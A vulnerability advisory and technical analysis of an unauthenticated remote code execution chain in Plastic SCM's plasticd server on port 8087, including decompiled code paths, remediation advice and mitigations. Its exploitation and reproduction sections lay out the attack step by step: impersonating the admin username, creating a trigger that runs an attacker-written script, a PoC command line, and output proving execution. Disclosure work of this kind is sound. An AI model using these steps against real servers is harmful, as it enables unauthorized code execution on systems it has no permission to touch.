# Plastic SCM (Unity VCS) Unauthenticated 8087 Name-Only ACL RCE - Technical Analysis

## Overview

Plastic SCM (Unity Version Control On-Prem, `plasticd`) 11.0.16.10303 listens for a self-developed binary version-control protocol on port 8087 (plain TCP) and 8088 (SSL). Under the default `NameWorkingMode`, the server validates only that a client-declared username maps to a local OS account and **never checks a password** (`LocalGroupSEIDProvider.CheckPassword` is an empty no-op). Combined with a default `EVERYBODY` ACL that grants `ALL_PERMISSIONS` (including `mktrigger`) to any name-only-authenticated user, an unauthenticated network attacker can declare an administrative username, create a server-side trigger whose `Path` is fully attacker-controlled, and trigger it with a repository operation. `TriggerProcess.ExecuteTrigger` parses the `Path` and feeds the first token straight into `Process.Start` as `FileName`, with no sandbox, path allowlist, or signature check — yielding remote code execution as the `plasticd` service account (Linux: `plasticscm` uid=217; Windows: local Administrator / service account).

## Architecture

```
L1 external access: 8087 plain TCP (plasticd self-developed protocol, default bind 0.0.0.0)
                    8088 SSL variant
L2 boundary: none on 8087 (plain); TLS on 8088
L3 gateway: PlasticPipe binary protocol — method dispatch by numeric id
L4 auth: server.conf WorkingMode (NameWorkingMode default = username only, no password)
         + per-endpoint RejectRemoteRequests flag (default false = accept remote)
L5 business: TriggerHandlerStub / RepositoryHandler / etc. — protocol method handlers
L6 storage: repository metadata + trigger store; ACLs in RepositoryStore.WritePermissions
            (default EVERYBODY_SEID = ALL_PERMISSIONS)
```

**Protocol**: `plasticd` speaks a `PlasticPipe` self-developed binary protocol. Methods are dispatched by numeric id (e.g. `CreateTrigger` = 3001, `GetRepositoryServerInfo` = 1012, `IsAdministrator` = 12018, `ChangeInCallContext` = 1).

## Authentication Boundary

### Protocol listening and remote acceptance

`plasticd` listens on 8087 via `PlasticPipe.PlasticProtocol.Server\ServerBasedOnTcpSocket.cs:135-145`:

```csharp
// StartListening
if (mRejectRemoteRequests) {
    mBindEndPoint = new IPEndPoint(IPAddress.Loopback, port);  // loopback only
} else {
    mBindEndPoint = new IPEndPoint(bindAddress, port);          // 0.0.0.0 / external
}
```

`RejectRemoteRequests` is a per-endpoint configuration flag (`NetworkConfiguration.EndPoint.RejectRemoteRequests`), default `false`. The standard team-server configuration sets 8087 with `RejectRemoteRequests=false` to allow remote clients → **remote connections accepted by default**.

### Authentication mode

`server.conf` `WorkingMode` decides the authentication mode. Default `NameWorkingMode`: validates only that the client-declared username maps to a server local OS user, **never checks the password**. Other modes (`UPWorkingMode` / `LDAPWorkingMode` / `TokenBasedAuthentication`) validate password / LDAP / token, but `NameWorkingMode` is the default and most common mode for small-team deployments.

### Admin username leakable unauthenticated

`GetRepositoryServerInfo` (method 1012) is on the `JustCheckCompatibility` list (no authentication). `RepositoryHandler.GetRepositoryServerInfo` (`Codice.CM.Server\RepositoryHandler.cs:344-350`) returns `RepositoryServerInfo.Owner` = the repository-server owner username. **An unauthenticated client can query the administrative username.**

## Stage 1: Sink Identification (Process.Start)

### Trigger execution sink

`Codice.CM.Triggers\TriggerProcess.cs:321-348`:

```csharp
public static void ExecuteTrigger(EnumTriggerEventType eventtype, TriggerInfo trigger, ...)
{
    if (IsWebTrigger(trigger.Path)) { ExecuteWebTrigger(...); return; }
    string text = trigger.Path;                              // attacker-controlled string
    TriggerCommand triggerCommand = ParseCommandArguments(text);
    if (string.IsNullOrEmpty(triggerCommand.Executable)) ThrowCmTriggerException(...);
    triggerCommand = SolveAndEscapeVariablesForArguments(triggerCommand, plasticVariables);
    NetProcess.Result result = NetProcess.Execute(
        triggerCommand.Executable, triggerCommand.GetArgumentsString(),
        trigger, input, environmentVariables, bFailOnMissing, timeoutMilliseconds, runBy, ...);
}
```

`Codice.CM.Triggers\NetProcess.cs:759-774,808`:

```csharp
internal static Result Execute(string executable, string parameters, TriggerInfo trigger, ...)
{
    process = BuildProcess(executable, parameters, environmentVariables);
    process.Start();   // <- RCE SINK
}

private static Process BuildProcess(string executable, string parameters, IDictionary environmentVariables)
{
    Process process = new Process();
    process.StartInfo.FileName = executable;       // <- attacker-controlled first token of trigger.Path
    process.StartInfo.Arguments = parameters;
    process.StartInfo.CreateNoWindow = true;
    process.StartInfo.UseShellExecute = false;     // not via shell; redirection needs a wrapper script
}
```

**Key point**: `Process.Start`'s `FileName` comes directly from `trigger.Path`, with no sandbox, no path allowlist, no signature check. `UseShellExecute=false` means the command is not run through a shell, so commands containing `>` / `|` and other metacharacters need a wrapper script to provide shell semantics.

## Stage 2: Source Identification (attacker-controlled trigger.Path)

### CreateTrigger protocol message (method 3001)

`PlasticPipe.PlasticProtocol.Server.Stubs\TriggerHandlerStub.cs:1294`:

```csharp
private INetworkMessage CreateTrigger(PlasticBinaryReader reader, IStubReadFinished finished)
{
    CreateTriggerMessage createTriggerMessage = new CreateTriggerMessage();
    createTriggerMessage.Deserialize(reader);
    finished.Notify();
    TriggerInfo trigger = mTriggerHandler.CreateTrigger(
        mGetOrganizationId.Get(CmCallContext.Current.GetOrganization()),
        createTriggerMessage.Trigger,         // <- attacker-controlled TriggerInfo (incl. .Path)
        CmCallContext.Current.GetCurrentTransaction(),
        CmCallContext.Current.GetUser(),      // <- attacker-controlled SEID (no password)
        CmCallContext.Current.GetMachineName());
}
```

`TriggerHandlerMessagesSerialization.DeserializeTriggerInfo:77`: `triggerInfo.Path = reader.ReadString();` — **the attacker fully controls this string**.

### Client-declared identity (CmCallContext)

`ConnectionFromClient.cs:375-417`: the initial `CmCallContext` message carries `UserCredentials` (SEID `User` + `Mode`); **the username and working mode are entirely client-controlled**. `ChangeInCallContext` (method 1, line 946) allows changing credentials mid-connection, also without password validation.

## Stage 3: Data Flow (Source -> Sink complete path)

### Authentication bypass (NameWorkingMode does not check password)

`SecurityManager\AuthPerCall.cs:477-484,510-542`:

```csharp
// CheckAuthentication
CheckWorkingMode(credentials, mIsLocalOnlyEditionServer);  // validates mode match only, not password
if (methodCall != null && IsTokenAuthenticationConfigured(out ldapTokensV, out authTokenV, out jwtAuth))
{
    CheckToken(credentials.User, ldapTokensV, authTokenV, jwtAuth);
}
```

`IsTokenAuthenticationConfigured` (line 418) returns true only when an LDAP/AD/JWT provider is fully configured. Under `NameWorkingMode` the SEID provider is `LocalGroupSEIDProvider` (no LDAP/AD/JWT), so it returns false → **`CheckToken` is never called**.

`Codice.CM.Server.LocalGroupProvider\LocalGroupSEIDProvider.cs:114-126`:

```csharp
SEID ISEIDProvider.GetSEID(string user, string password, short clientBuildNumber)
{
    SEID sEIDFromName = ((ISEIDProvider)this).GetSEIDFromName(user, false);
    if (sEIDFromName == null) throw new CmInvalidCredentialsException();
    return sEIDFromName;     // <- password parameter entirely ignored
}

void ISEIDProvider.CheckPassword(SEID seidToCheck)
{
    // empty method - no-op
}
```

### Sole identity check (IsKnownSeid = must be a local OS user)

`WinServerGroupInfo.IsKnownSeid:16` (NameWorkingMode):

```csharp
case SEIDWorkingMode.NameWorkingMode:
    if (seid.Data == Environment.UserName) return true;       // the service account itself
    if (CheckName(seid.Data, domainControllerFromWorkingMode)) return true;  // resolves to a local Windows user SID
    return false;
```

Linux equivalent: `UnixServerGroupInfo.IsKnownSeid` iterates `SystemdUnixUserInfo.GetLocalUsers()` matching local Unix users.

**Result**: an attacker can declare **any local OS user** (root / Administrator / service account / any real local user) and connect with no password. The username must correspond to a real local OS account, but the password is never checked.

### admin = repository server owner

`SecurityManager\User.cs:167-186`:

```csharp
internal bool IsAdministrator(uint orgId, SEID seid)
{
    SEID administrator = GetAdministrator(orgId);
    return mUserInfoLoader.IsAdministrator(seid, administrator);
}
```

`Codice.CM.Server\RepositoryHandler.cs:721-731`:

```csharp
private static void UpdateRepositoryServerOwner(uint orgId, SEID user, RepositoryType type, string clientMachine)
{
    if (type == RepositoryType.VCS)
    {
        SEID repositoryServerOwner = DataQueryFactory.GetOwnerQuery().GetRepositoryServerOwner(orgId);
        if ((repositoryServerOwner == null || repositoryServerOwner.Equals(SEIDConsts.EVERYBODY_SEID))
            && RepositoryQueryFactory.Get().GetAllRepositories(orgId, RepositoryType.VCS).Count <= 0)
        {
            SecurityFactory.SetRepositoryServerOwner(orgId, user, user, clientMachine);
        }
    }
}
```

**The first user to create a VCS repository becomes the repository server owner (admin).** In a typical deployment this is the OS account first used with the server (root / Administrator / a dedicated service account).

### Permission gate short-circuited by admin

`SecurityManager.CheckPerm\CheckPermission.cs:72-90`:

```csharp
public bool CheckSOT(uint orgId, SOT sot, SEID sotOwner, Guid trId, SEID seid, string clientMachine, Permissions permissions, PlasticMethodCall methodCall)
{
    if (CheckPermissionContext(sot)) return true;
    CheckUserCanLogin(seid, methodCall);
    if (mSeidRetriever.IsAdministrator(orgId, seid)) return true;   // <- ADMIN short-circuits all permissions
    ...
}
```

The attacker connects with the admin username → `seid.Data == administrator.Data` → `IsAdministrator` returns true → `CheckSOT` returns true → **mktrigger permission granted**. (Even for a non-admin username, the default `EVERYBODY` ACL grants `ALL_PERMISSIONS` including `mktrigger`; the admin path is simply the most direct.)

### Complete data flow

```
attacker TCP client
  -> ConnectionFromClient.ProcessCallContext  [client-controlled UserCredentials.User.Data, Mode=NameWorkingMode]
  -> ConnectionFromClient.ProcessMethodCall (method=3001 CreateTrigger)
  -> TriggerHandlerStub.CreateTrigger
  -> CreateTriggerMessage.Deserialize  [TriggerInfo.Path = attacker string]
  -> SecuredTriggerHandler.CreateTrigger
  -> CheckRepServerPermission(orgId, mktrigger, user=attacker_seid)
  -> CheckPermission.CheckSOT
  -> mSeidRetriever.IsAdministrator(orgId, seid)  [seid.Data == admin.Data -> TRUE]
  -> return true  (permission granted, password never checked)
  -> TriggerHandler.CreateTrigger  [stores trigger with attacker Path]
  ...
  -> (attacker performs mkbranch/checkin)
  -> TriggerManager.RunCheckInTriggers / RunAddItemAfterTriggers
  -> ExecuteServerSideTriggers
  -> TriggerRunner.ExecuteServerSideTriggers
  -> TriggerProcess.ExecuteTrigger
  -> ParseCommandArguments(trigger.Path)  [Executable = first token, Arguments = rest]
  -> NetProcess.Execute(executable, parameters, ...)
  -> BuildProcess  [process.StartInfo.FileName = executable]
  -> process.Start()   <- RCE as plasticd service account
```

## Stage 4: Injection / Exploitation Construction

### Attack steps

1. **TCP connect to 8087**, capability negotiation (send `ClientCapabilitiesMessage`).
2. **Send initial `CmCallContext`**: `UserCredentials.User.Data="<admin username>"` (the repository server owner, leakable unauthenticated via `GetRepositoryServerInfo` or guessable as root / Administrator), `Mode=NameWorkingMode`, no password.
3. **(Optional) verify admin**: call `GetRepositoryServerInfo` (1012) to read back the owner name, or call `IsAdministrator` (12018) to confirm.
4. **Send `CreateTrigger` (3001)**: `TriggerInfo.Path = attacker command line`, `Type=after-mkbranch` (or checkin), `EventType=after`. Server `IsAdministrator=true` → mktrigger granted → trigger stored.
5. **Trigger it**: perform the matching repository operation (mkbranch triggers after-mkbranch; checkin triggers after-checkin). admin bypasses all repo permissions.
6. **RCE achieved**: `Process.Start(attacker command)` runs as the `plasticd` service account.

### Command construction (shell semantics)

`Process.Start` uses `UseShellExecute=false`, so it does not go through a shell; `>` / `|` / `&` and other metacharacters are passed as literal arguments. Commands containing redirection or pipes need a **wrapper script** to provide shell semantics:

- **Linux**: write `/tmp/plastic_rce.sh` (`#!/bin/sh\n<attacker command>`, `chmod +x`), trigger `Path = /tmp/plastic_rce.sh`.
- **Windows**: write `C:\tmp\plastic_rce.bat` (`@echo off\r\n<attacker command>`), trigger `Path = cmd /c C:\tmp\plastic_rce.bat`.

The PoC handles this automatically (Step 2.5).

## Stage 5: Dynamic Verification

### Deployment

- **Linux server `<target-host>`**: `plasticscm-server-core-11.0.16.10303-2.1.x86_64.rpm` direct install, systemd `--daemon` service (`User=plasticscm`), listening on `0.0.0.0:8087`, default `NameWorkingMode`.
- **Attacker client**: Linux `cm` 11.0.16.10303.

### Running the PoC

```bash
python3 exploit/plastic_scm_unauth_8087_rce.py 127.0.0.1 8087 root "id > /tmp/plastic_pwned.txt"
```

### Dynamic verification evidence

**Step 2 — authentication bypass**: `cm listrep --server=127.0.0.1:8087` (no password, NameWorkingMode) → returns `default@127.0.0.1:8087`. Confirms `LocalGroupSEIDProvider.CheckPassword` is an empty no-op and `IsKnownSeid` only validates that the username maps to a local OS user.

**Step 3 — ACL grant**: `cm trigger create after-mkbranch rce_poc /tmp/plastic_rce.sh --server=127.0.0.1:8087` → `Trigger created on position 1.` (exit=0). Confirms admin (root username) `IsAdministrator=true` short-circuits the mktrigger permission gate.

**Step 5 — RCE execution**: `cm mkbranch br:/br_rce_poc_...@rep:default@127.0.0.1:8087` (exit=0) → after-mkbranch trigger fires → `Process.Start` executes `/tmp/plastic_rce.sh`.

**Step 6 — marker verification**:

```bash
$ ls -la /tmp/plastic_pwned.txt
-rw-r--r-- 1 plasticscm plasticscm 63 Aug  2 02:45 /tmp/plastic_pwned.txt
$ cat /tmp/plastic_pwned.txt
uid=217(plasticscm) gid=218(plasticscm) groups=218(plasticscm)
```

The marker file is created by `plasticscm:plasticscm` (the `plasticd` service account) and its content is the `id` output → **RCE executing with `plasticd` service privileges confirmed**.

**Windows-side verification (prior dyn5/6/7)**: on Windows server `<windows-host>` against `plasticd --console` the same chain was verified; marker `C:\tmp\plastic_pwned.txt` content `PLASTIC_PWNED`, `whoami` = `<windows-host>\administrator` (local Administrator).

## Stage 6: Reachability

### Default-configuration reachability

| Config item | Default | Reachability impact |
|--------|--------|-----------|
| WorkingMode | NameWorkingMode | no password, username only |
| 8087 bind | 0.0.0.0 | remotely reachable |
| RejectRemoteRequests | false | accepts remote connections |
| EVERYBODY ACL | ALL_PERMISSIONS | any name-only-authenticated user gets mktrigger (even non-admin; admin path is more direct) |

### Obtaining the admin username

- `GetRepositoryServerInfo` (method 1012, no authentication) leaks the owner username.
- Guessing: root / Administrator / plasticscm / plasticd and other common service-account names.
- In dynamic verification, `root` (a Linux local user) succeeded.

## Stage 7: Defense in Depth / Remediation

### Root cause

`NameWorkingMode` is designed for "trusted networks" where clients are identified by name only, but it equates "client declares a name" with "client is that user" without any shared secret. Any host that can reach the protocol port can impersonate admin. Documentation warns that `NameWorkingMode` is "for trusted networks only", but does not explicitly state that "any network visitor is effectively admin", and the mode is the default for many small-team deployments.

### Remediation suggestions (for vendor disclosure)

1. Require a shared secret / password to establish a SEID under `NameWorkingMode`, or restrict trigger creation (and other sensitive operations) to a separately authenticated admin channel.
2. Default to `RejectRemoteRequests=true` and raise a loud warning when `NameWorkingMode` is combined with a non-loopback bind.
3. `IsAdministrator` must not be satisfied by a client-declared username alone (without credentials).
4. trigger `Path` should be subject to a path allowlist / signature check / sandboxed execution.

### Mitigation (user-side)

- Bind 8087 to loopback or firewall-restrict source IPs.
- Switch to `UPWorkingMode` / `LDAPWorkingMode` / `TokenBasedAuthentication` (validates password / LDAP / token).
- Set `RejectRemoteRequests=true`.
- Restrict the `plasticd` service account privileges (not root / Administrator).

## Reproduction

```bash
# 1. Deploy plasticd (Linux, systemd --daemon, default NameWorkingMode)
#    rpm -ivh plasticscm-server-core-11.0.16.10303-2.1.x86_64.rpm
#    systemctl start plasticscm-server

# 2. Install the Linux cm client (11.0.16.10303, version must match exactly)
#    Download the client-core tarball from the release, extract, add a PATH wrapper

# 3. Run the PoC
python3 exploit/plastic_scm_unauth_8087_rce.py 127.0.0.1 8087 root "id > /tmp/plastic_pwned.txt"

# 4. Verify the marker
ls -la /tmp/plastic_pwned.txt
cat /tmp/plastic_pwned.txt
# expected: a file owned by the plasticscm user, content uid=217(plasticscm)...
```

The full PoC is in `exploit/plastic_scm_unauth_8087_rce.py` (Python standard library only, verified end-to-end).

## Credits

Discovered by 0day Rubbish Project using automated AI vulnerability research with multi-LLM ensemble (Claude, OpenAI, DeepSeek, GLM).

---

*Disclaimer: This research was conducted for defensive purposes. Always obtain proper authorization before testing systems you don't own. Responsible disclosure practices apply.*
